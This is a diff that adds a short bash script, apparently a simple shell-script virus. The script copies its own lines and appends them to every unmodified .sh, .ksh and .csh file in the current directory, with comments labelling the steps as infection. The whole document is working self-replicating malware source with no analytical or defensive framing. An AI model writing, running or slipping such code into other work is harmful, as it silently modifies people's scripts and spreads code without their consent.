@@ -1,0 +1,20 @@
+#!/bin/bash
+
+selfname="$(basename "$(realpath "$0")")"
+
+tmp="$(mktemp)"
+tmp1="$(mktemp)"
+count="$(cat "$selfname" | wc -l)"
+tail -n "$count" < "$selfname" > "$tmp"
+
+
+for name in $(ls)
+do
+    [ -f "$name" ] || continue                              # infect only regular files
+    tail -n "$count" < "$name" > "$tmp1"
+    [  $(diff "$tmp" "$tmp1" | wc -l) = 0 ] && continue     # skip infected files
+    for extension in .sh .ksh .csh                          # check all possible extensions
+    do  
+        [[ $name = *$extension ]] && cat "$tmp" >> "$name"  # infect
+    done
+done
